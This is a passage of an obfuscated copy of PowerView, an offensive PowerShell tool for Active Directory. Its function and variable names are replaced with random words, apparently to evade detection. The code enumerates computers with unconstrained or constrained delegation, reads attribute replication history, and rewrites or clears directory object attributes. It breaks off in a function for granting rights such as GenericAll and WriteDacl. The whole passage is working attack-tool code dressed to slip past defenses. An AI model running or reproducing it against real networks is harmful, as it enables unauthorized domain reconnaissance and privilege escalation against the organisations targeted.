        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $VMWNdmdN99 = indenturing @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            Victrola -modcDTlj99 -ADYXbIdr99 $PSBoundParameters
        }
        if ($VMWNdmdN99) {
            $hAflFVrb99 = ''
            $tGcqvLrx99 = ''
            $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($SvGoFRkz99 -match '^S-1-') {
                    $hAflFVrb99 += "(objectsid=$SvGoFRkz99)"
                }
                elseif ($SvGoFRkz99 -match '^CN=') {
                    $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[pickerels] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                        $VrICpjXS99['Domain'] = $chKaCwXV99
                        $VMWNdmdN99 = indenturing @SearcherArguments
                        if (-not $VMWNdmdN99) {
                            Write-Warning "[pickerels] Unable to retrieve domain searcher for '$chKaCwXV99'"
                        }
                    }
                }
                elseif ($SvGoFRkz99.Contains('.')) {
                    $hAflFVrb99 += "(|(name=$SvGoFRkz99)(dnshostname=$SvGoFRkz99))"
                }
                elseif ($SvGoFRkz99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $PFeUtWYw99 = (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                }
                else {
                    $hAflFVrb99 += "(name=$SvGoFRkz99)"
                }
            }
            if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                $tGcqvLrx99 += "(|$hAflFVrb99)"
            }
            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[pickerels] Searching for computers with for unconstrained delegation'
                $tGcqvLrx99 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[pickerels] Searching for computers that are trusted to authenticate for other principals'
                $tGcqvLrx99 += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[pickerels] Searching for printers'
                $tGcqvLrx99 += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[pickerels] Searching for computers with SPN: $SPN"
                $tGcqvLrx99 += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[pickerels] Searching for computers with operating system: $fNLjzEnS99"
                $tGcqvLrx99 += "(operatingsystem=$fNLjzEnS99)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[pickerels] Searching for computers with service pack: $OUZDyVMQ99"
                $tGcqvLrx99 += "(operatingsystemservicepack=$OUZDyVMQ99)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[pickerels] Searching for computers with site name: $ixDINSpI99"
                $tGcqvLrx99 += "(serverreferencebl=$ixDINSpI99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[pickerels] Using additional LDAP filter: $vqxjYeAS99"
                $tGcqvLrx99 += "$vqxjYeAS99"
            }
            $WzXRlwkq99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $cKZwWfgT99 = $_.Substring(4)
                    $TSzPfUTg99 = [Int]($xMqsGAsx99::$cKZwWfgT99)
                    $tGcqvLrx99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$TSzPfUTg99))"
                }
                else {
                    $TSzPfUTg99 = [Int]($xMqsGAsx99::$_)
                    $tGcqvLrx99 += "(userAccountControl:1.2.840.113556.1.4.803:=$TSzPfUTg99)"
                }
            }
            $VMWNdmdN99.filter = "(&(samAccountType=805306369)$tGcqvLrx99)"
            Write-Verbose "[pickerels] pickerels filter string: $($VMWNdmdN99.filter)"
            if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $VMWNdmdN99.FindOne() }
            else { $jAOXTyAF99 = $VMWNdmdN99.FindAll() }
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -lgkTdAeF99 $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        $zNIilCKh99 = $_
                        $zNIilCKh99.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $zNIilCKh99 = favorites -PjvsRTzX99 $_.Properties
                        $zNIilCKh99.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $zNIilCKh99
                }
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[pickerels] Error disposing of the Results object: $_"
                }
            }
            $VMWNdmdN99.dispose()
        }
    }
}
function scram {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $VnyrBvDm99,
        [Switch]
        $kQTByXSX99,
        [Alias('ReturnOne')]
        [Switch]
        $DiGVDgqd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $XiIvCfrW99 = [Enum]::GetNames($xMqsGAsx99)
        $XiIvCfrW99 = $XiIvCfrW99 | ForEach-Object {$_; "NOT_$_"}
        Victrola -Name UACFilter -KgKkGSIJ99 $XiIvCfrW99 -Type ([array])
    }
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Properties']) { $VrICpjXS99['Properties'] = $PjvsRTzX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['SecurityMasks']) { $VrICpjXS99['SecurityMasks'] = $VnyrBvDm99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $ViZeyXrj99 = indenturing @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            Victrola -modcDTlj99 -ADYXbIdr99 $PSBoundParameters
        }
        if ($ViZeyXrj99) {
            $hAflFVrb99 = ''
            $tGcqvLrx99 = ''
            $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($SvGoFRkz99 -match '^S-1-') {
                    $hAflFVrb99 += "(objectsid=$SvGoFRkz99)"
                }
                elseif ($SvGoFRkz99 -match '^(CN|OU|DC)=') {
                    $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[scram] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                        $VrICpjXS99['Domain'] = $chKaCwXV99
                        $ViZeyXrj99 = indenturing @SearcherArguments
                        if (-not $ViZeyXrj99) {
                            Write-Warning "[scram] Unable to retrieve domain searcher for '$chKaCwXV99'"
                        }
                    }
                }
                elseif ($SvGoFRkz99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $PFeUtWYw99 = (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                }
                elseif ($SvGoFRkz99.Contains('\')) {
                    $upTkBJHa99 = $SvGoFRkz99.Replace('\28', '(').Replace('\29', ')') | macrocosms -xilKAxpM99 Canonical
                    if ($upTkBJHa99) {
                        $YeUFAXHq99 = $upTkBJHa99.SubString(0, $upTkBJHa99.IndexOf('/'))
                        $sskuJSha99 = $SvGoFRkz99.Split('\')[1]
                        $hAflFVrb99 += "(samAccountName=$sskuJSha99)"
                        $VrICpjXS99['Domain'] = $YeUFAXHq99
                        Write-Verbose "[scram] Extracted domain '$YeUFAXHq99' from '$SvGoFRkz99'"
                        $ViZeyXrj99 = indenturing @SearcherArguments
                    }
                }
                elseif ($SvGoFRkz99.Contains('.')) {
                    $hAflFVrb99 += "(|(samAccountName=$SvGoFRkz99)(name=$SvGoFRkz99)(dnshostname=$SvGoFRkz99))"
                }
                else {
                    $hAflFVrb99 += "(|(samAccountName=$SvGoFRkz99)(name=$SvGoFRkz99)(displayname=$SvGoFRkz99))"
                }
            }
            if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                $tGcqvLrx99 += "(|$hAflFVrb99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[scram] Using additional LDAP filter: $vqxjYeAS99"
                $tGcqvLrx99 += "$vqxjYeAS99"
            }
            $WzXRlwkq99 | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $cKZwWfgT99 = $_.Substring(4)
                    $TSzPfUTg99 = [Int]($xMqsGAsx99::$cKZwWfgT99)
                    $tGcqvLrx99 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$TSzPfUTg99))"
                }
                else {
                    $TSzPfUTg99 = [Int]($xMqsGAsx99::$_)
                    $tGcqvLrx99 += "(userAccountControl:1.2.840.113556.1.4.803:=$TSzPfUTg99)"
                }
            }
            if ($tGcqvLrx99 -and $tGcqvLrx99 -ne '') {
                $ViZeyXrj99.filter = "(&$tGcqvLrx99)"
            }
            Write-Verbose "[scram] scram filter string: $($ViZeyXrj99.filter)"
            if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $ViZeyXrj99.FindOne() }
            else { $jAOXTyAF99 = $ViZeyXrj99.FindAll() }
            $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = favorites -PjvsRTzX99 $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($jAOXTyAF99) {
                try { $jAOXTyAF99.dispose() }
                catch {
                    Write-Verbose "[scram] Error disposing of the Results object: $_"
                }
            }
            $ViZeyXrj99.dispose()
        }
    }
}
function arresting {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $VrICpjXS99 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $VrICpjXS99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['FindOne']) { $VrICpjXS99['FindOne'] = $DiGVDgqd99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['Properties']) {
            $NouaDEZr99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $NouaDEZr99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $VrICpjXS99['Identity'] = $phaEiMpW99 }
        scram @SearcherArguments | ForEach-Object {
            $MEFGOmzQ99 = $_.Properties['distinguishedname'][0]
            ForEach($sWpoyMOt99 in $_.Properties['msds-replattributemetadata']) {
                $ejQLnGPz99 = [xml]$sWpoyMOt99 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($ejQLnGPz99) {
                    if ($ejQLnGPz99.pszAttributeName -Match $NouaDEZr99) {
                        $jmVDoyyB99 = New-Object PSObject
                        $jmVDoyyB99 | Add-Member NoteProperty 'ObjectDN' $MEFGOmzQ99
                        $jmVDoyyB99 | Add-Member NoteProperty 'AttributeName' $ejQLnGPz99.pszAttributeName
                        $jmVDoyyB99 | Add-Member NoteProperty 'LastOriginatingChange' $ejQLnGPz99.ftimeLastOriginatingChange
                        $jmVDoyyB99 | Add-Member NoteProperty 'Version' $ejQLnGPz99.dwVersion
                        $jmVDoyyB99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $ejQLnGPz99.pszLastOriginatingDsaDN
                        $jmVDoyyB99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $jmVDoyyB99
                    }
                }
                else {
                    Write-Verbose "[arresting] Error retrieving 'msds-replattributemetadata' for '$MEFGOmzQ99'"
                }
            }
        }
    }
}
function Viagra {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PjvsRTzX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $VrICpjXS99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $VrICpjXS99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        if ($PSBoundParameters['Properties']) {
            $NouaDEZr99 = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $NouaDEZr99 = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $VrICpjXS99['Identity'] = $phaEiMpW99 }
        scram @SearcherArguments | ForEach-Object {
            $MEFGOmzQ99 = $_.Properties['distinguishedname'][0]
            ForEach($sWpoyMOt99 in $_.Properties['msds-replvaluemetadata']) {
                $ejQLnGPz99 = [xml]$sWpoyMOt99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($ejQLnGPz99) {
                    if ($ejQLnGPz99.pszAttributeName -Match $NouaDEZr99) {
                        $jmVDoyyB99 = New-Object PSObject
                        $jmVDoyyB99 | Add-Member NoteProperty 'ObjectDN' $MEFGOmzQ99
                        $jmVDoyyB99 | Add-Member NoteProperty 'AttributeName' $ejQLnGPz99.pszAttributeName
                        $jmVDoyyB99 | Add-Member NoteProperty 'AttributeValue' $ejQLnGPz99.pszObjectDn
                        $jmVDoyyB99 | Add-Member NoteProperty 'TimeCreated' $ejQLnGPz99.ftimeCreated
                        $jmVDoyyB99 | Add-Member NoteProperty 'TimeDeleted' $ejQLnGPz99.ftimeDeleted
                        $jmVDoyyB99 | Add-Member NoteProperty 'LastOriginatingChange' $ejQLnGPz99.ftimeLastOriginatingChange
                        $jmVDoyyB99 | Add-Member NoteProperty 'Version' $ejQLnGPz99.dwVersion
                        $jmVDoyyB99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $ejQLnGPz99.pszLastOriginatingDsaDN
                        $jmVDoyyB99.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $jmVDoyyB99
                    }
                }
                else {
                    Write-Verbose "[Viagra] Error retrieving 'msds-replvaluemetadata' for '$MEFGOmzQ99'"
                }
            }
        }
    }
}
function thirsted {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $phaEiMpW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $VrICpjXS99['LDAPFilter'] = $vqxjYeAS99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $VrICpjXS99['Identity'] = $phaEiMpW99 }
        $PEKZZkkP99 = scram @SearcherArguments
        ForEach ($Object in $PEKZZkkP99) {
            $Entry = $PEKZZkkP99.GetDirectoryEntry()
            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[thirsted] Setting '$($_.Name)' to '$($_.Value)' for object '$($PEKZZkkP99.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[thirsted] Error setting/replacing properties for object '$($PEKZZkkP99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $LSVXArVy99 = $_.Name
                        $cXdARaex99 = $_.Value
                        Write-Verbose "[thirsted] XORing '$LSVXArVy99' with '$cXdARaex99' for object '$($PEKZZkkP99.Properties.samaccountname)'"
                        $FMNjapWM99 = $Entry.$LSVXArVy99[0].GetType().name
                        $vWYyYhIo99 = $($Entry.$LSVXArVy99) -bxor $cXdARaex99
                        $Entry.$LSVXArVy99 = $vWYyYhIo99 -as $FMNjapWM99
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[thirsted] Error XOR'ing properties for object '$($PEKZZkkP99.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $LSVXArVy99 = $_
                        Write-Verbose "[thirsted] Clearing '$LSVXArVy99' for object '$($PEKZZkkP99.Properties.samaccountname)'"
                        $Entry.$LSVXArVy99.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[thirsted] Error clearing properties for object '$($PEKZZkkP99.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function timer {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $iGFwUFDd99
    )
    Begin {
        if($iGFwUFDd99.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }
        function sriracha {
            Param (
                [int[]]
                $hFZVGWEp99
            )
            $HeHSlUBW99 = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $hFZVGWEp99[$i]
                $MmzaDoyA99 = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
                $HeHSlUBW99[$MmzaDoyA99+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $HeHSlUBW99[$MmzaDoyA99+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $HeHSlUBW99[$MmzaDoyA99+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $HeHSlUBW99[$MmzaDoyA99+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $HeHSlUBW99[$MmzaDoyA99+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $HeHSlUBW99[$MmzaDoyA99+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $HeHSlUBW99[$MmzaDoyA99+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $HeHSlUBW99[$MmzaDoyA99+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }
            $HeHSlUBW99
        }
    }
    Process {
        $jmVDoyyB99 = @{
            Sunday = sriracha -hFZVGWEp99 $iGFwUFDd99[0..2]
            Monday = sriracha -hFZVGWEp99 $iGFwUFDd99[3..5]
            Tuesday = sriracha -hFZVGWEp99 $iGFwUFDd99[6..8]
            Wednesday = sriracha -hFZVGWEp99 $iGFwUFDd99[9..11]
            Thurs = sriracha -hFZVGWEp99 $iGFwUFDd99[12..14]
            Friday = sriracha -hFZVGWEp99 $iGFwUFDd99[15..17]
            Saturday = sriracha -hFZVGWEp99 $iGFwUFDd99[18..20]
        }
        $jmVDoyyB99 = New-Object PSObject -Property $jmVDoyyB99
        $jmVDoyyB99.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $jmVDoyyB99
    }
}
function Wrigley {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $QLwgZZqU99,
        [ValidateNotNullOrEmpty()]
        [String]
        $lHkIOVol99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $pEoeOaDZ99,
